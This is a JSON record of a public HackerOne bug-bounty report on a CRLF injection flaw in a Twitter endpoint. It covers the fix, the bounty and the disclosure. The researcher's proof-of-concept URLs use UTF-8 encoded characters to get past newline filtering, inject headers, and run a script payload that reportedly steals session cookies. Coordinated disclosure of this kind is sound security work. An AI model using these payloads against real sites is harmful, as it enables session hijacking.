{"id":52042,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MjA0Mg==","url":"https://hackerone.com/reports/52042","title":"HTTP Response Splitting (CRLF injection) in report_story","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-03-15T07:49:31.208Z","submitted_at":"2015-03-15T07:49:31.208Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"filedescriptor","url":"/filedescriptor","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":61,"url":"https://hackerone.com/twitter","handle":"twitter","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Twitter","twitter_handle":"twittersecurity","website":"https://twitter.com","about":"Twitter helps you create and share ideas and information instantly, without barriers."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2015-04-21T17:59:23.057Z","bug_reporter_agreed_on_going_public_at":"2015-04-21T17:59:22.520Z","team_member_agreed_on_going_public_at":"2015-04-13T19:15:22.382Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\r\n\r\nI would like to report a HTTP Response Splitting vulnerability in https://twitter.com/i/safety/report_story that allows attackers to inject arbitrary headers and contents in the response. \r\n\r\n## PoC:\r\nhttps://twitter.com/i/safety/report_story?next_view=report_story_start\u0026source=reporttweet\u0026reported_user_id=1\u0026reporter_user_id=1\u0026is_media=true\u0026is_promoted=true\u0026reported_tweet_id=%E5%98%8A%E5%98%8DSet-Cookie:%20test\r\n\r\n## Details:\r\nThe page will set cookie for the parameter *reported_tweet_id*. However, it doesn't validate strictly if it is a number. Although there is a protection against CRLF injection by detecting the presence of any *NewLine* character (0x0a), it can be bypassed with characters encoded in UTF-8 as the the page will try to convert them back to the original Unicode form and extract the last byte. For example, *%E5%98%8A* =\u003e *U+560A* =\u003e *0A*.","bounty_amount":"3500.0","formatted_bounty":"$3,500","original_report_id":null,"original_report_url":null,"attachments":[{"id":32110,"file_name":"twitter_crlf.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/032/110/1273cf910bf42fb1b2819916fa0749685ae2db65/twitter_crlf.png?response-content-disposition=attachment%3B%20filename%3D%22twitter_crlf.png%22%3B%20filename%2A%3DUTF-8%27%27twitter_crlf.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQX46P3UGI%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150859Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIGvlFSN4tPhAu4V7v5pc7%2F6eSiik7IhHLLD01kiqhVWYAiB5Dz9ea%2BLZD%2BpLtagj4O%2BjrW%2FPBVXyOw%2FvfPhYOWnLJyqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMy2N4EHiSo%2FA9G2F0KtcDeo3CuylmH%2BuFka3rGPAArFX7PEojyq8EAAWPijF4XtZGXNXpmeQR1pzTOcI0Rm%2Fvja%2BwHd%2F8TxJsGVWeh%2Flk5vjiIRZT9GPW9u3ZycCrjqMci9iGhBM6uwkYQOmABA3poTj0CyTV9vU5PwMEPHFcEacwKutRiCveofJe7f8Tu4WHR%2BNU7KEmxqtXpvAXj8hQLxFVDU25WgaPgk2b4mSQSaY%2FPywLP4TuBkCMbSNVoBG2JTX5CaBeJN5iElkzZ62K%2FGVGXrbaaNyPhn%2BB8rXIjbw78eQJEkHjvT8OqfCHAYP5f%2B4IhYfTll35nE7LIUoMiLvBq6tkN5BWqoopu%2Fpju60lSqB656qlcZeAK9f5orDqJzDwlKMnoVzqvkUrUy9bmk%2BkxGW97VVmeHZ1t0v3wof%2BrT0QSrWeBO35JesCQ%2BdFE8O%2BxosSdP7tU4A%2BDPpxwomZQHAAcNR9Aywt%2FQ8Qbv894mkGzt9WDwY%2FFN8jeU3O6C%2BmyqjrgMf7nGycFeD87%2Bsgs8CikLj6%2BhBYFpskae2EppYXvqHFDwWaJKFLdI8X3NNsrRpCnIXL5GUe8p%2BBySjVvE4SnyaxoJD5sUMGcJj0QQyQGgO22eUI1ATV1DsO%2BN%2BaLLxtMPqIkYsGOqYBTa91vvmG%2BK28LWqLSYG8vhMxYQ%2Fxj6PD70iq5MyM9pLPu1bgCyqJfX2mwm9fHA6UDqgGoerI%2Bnp3Q6V4OYY0E3hEAx7T8Q%2FppO8G%2BTgH7gaNlLC%2Fng4%2BkFoIuXyVGb7q1PCueRn4pqAqwTocflxXYcQQGudKiKkzrNHGy4UeULO76lDgSIcMEtI1vIJ76b2MxFEJwq4lWhln09Xn3ksb8maUXRDeCg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=2cc53a2b9fef8e61faa1eb89052b5af22733bc09c8cbd06416728fcb9e371f21","file_size":85869,"type":"image/png"}],"allow_singular_disclosure_at":"2015-05-13T19:15:40.320Z","allow_singular_disclosure_after":-202420399.1532993,"singular_disclosure_allowed":true,"vote_count":50,"voters":["canarinho_pistola","tolga","dejavuln","anovg","realtess","ankitsingh","pinch","brodie_codie","xsam","geeknik","and 40 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":356040,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.\n\nThank you for helping keep Twitter secure!","automated_response":false,"created_at":"2015-03-16T18:22:29.296Z","updated_at":"2015-03-16T18:22:29.296Z","actor":{"username":"jcollins","cleared":false,"url":"/jcollins","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/114/d24b9beb256b432cb38b64b8e3620e03aef9332a_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":357482,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This issue can be extended to enable the attacker to steal certain httpOnly protected cookies, namely *\\_twitter_sess* and *auth_token*, so that the attacker can take over the victim's session.\n\nPoC (works on Firefox): [https://twitter.com/login?redirect_after_login=https://twitter.com:21/%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE](https://twitter.com/login?redirect_after_login=https://twitter.com:21/%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%29%E5%98%BE)\n\n","automated_response":false,"created_at":"2015-03-18T10:52:00.575Z","updated_at":"2015-03-18T11:02:18.550Z","actor":{"username":"filedescriptor","cleared":true,"url":"/filedescriptor","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":357504,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here is a video demonstration to depict the above issue:\nhttps://vimeo.com/122522782 (Password: canvas)","automated_response":false,"created_at":"2015-03-18T11:22:46.983Z","updated_at":"2015-03-18T11:22:46.983Z","actor":{"username":"filedescriptor","cleared":true,"url":"/filedescriptor","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":358951,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, thank you for the additional information. We are working to resolve this as quickly as possible. Thank you for your patience.","automated_response":false,"created_at":"2015-03-19T21:29:05.458Z","updated_at":"2015-03-19T21:29:05.458Z","actor":{"username":"jcollins","cleared":false,"url":"/jcollins","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/114/d24b9beb256b432cb38b64b8e3620e03aef9332a_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":359837,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks again. As mentioned weâ€™ll keep you updated as we investigate further. As a reminder, please remember to keep the details of this report private until we have fully investigated and addressed the issue.","automated_response":false,"created_at":"2015-03-21T03:43:31.239Z","updated_at":"2015-03-21T03:43:31.239Z","actor":{"url":"/twitter","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Twitter"}},"bounty_amount":"3500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"twitter","collaborator":{"username":"filedescriptor","url":"/filedescriptor"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":364983,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We consider this issue to be fixed now. Can you please confirm?\n\nThank you for helping keep Twitter secure!","automated_response":false,"created_at":"2015-03-27T22:32:41.461Z","updated_at":"2015-03-27T22:32:41.461Z","actor":{"username":"jcollins","cleared":false,"url":"/jcollins","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/114/d24b9beb256b432cb38b64b8e3620e03aef9332a_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"filedescriptor","url":"/filedescriptor"},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":365124,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I can confirm this is fixed, thanks!\nBy the way, may I know the root cause of this issue? I wonder if this is Twitter specific or  framework related.","automated_response":false,"created_at":"2015-03-28T06:32:12.667Z","updated_at":"2015-03-28T06:33:29.197Z","actor":{"username":"filedescriptor","cleared":true,"url":"/filedescriptor","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":379085,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Hi, thank you for reporting this issue.\n\nUnfortunately, we cannot provide information about the cause of the vulnerability.\n\nWe are requesting public disclosure of this bug to encourage more reports of this quality. Thanks again!","automated_response":false,"created_at":"2015-04-13T19:15:22.497Z","updated_at":"2015-04-13T19:15:22.497Z","first_to_agree":true,"actor":{"username":"jcollins","cleared":false,"url":"/jcollins","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/114/d24b9beb256b432cb38b64b8e3620e03aef9332a_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":386573,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2015-04-21T17:59:22.621Z","updated_at":"2015-04-21T17:59:22.621Z","actor":{"username":"filedescriptor","cleared":true,"url":"/filedescriptor","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":386574,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2015-04-21T17:59:23.087Z","updated_at":"2015-04-21T17:59:23.087Z","actor":{"username":"filedescriptor","cleared":true,"url":"/filedescriptor","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":69,"category":"researcher","content":"Write-up: https://blog.innerht.ml/twitter-crlf-injection/","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":9081,"username":"filedescriptor","name":"filedescriptor","bio":"\\\"","cleared":true,"website":"https://www.youtube.com/channel/UCCp25j1Zh9vc_WFm-nB9fhQ","location":"","created_at":"2014-08-16T03:54:09.722Z","url":"https://hackerone.com/filedescriptor","anc_triager":false,"hackerone_triager":false,"hackerone_employee":false,"user_type":"hacker","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png","medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png","xtralarge":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"}}}]}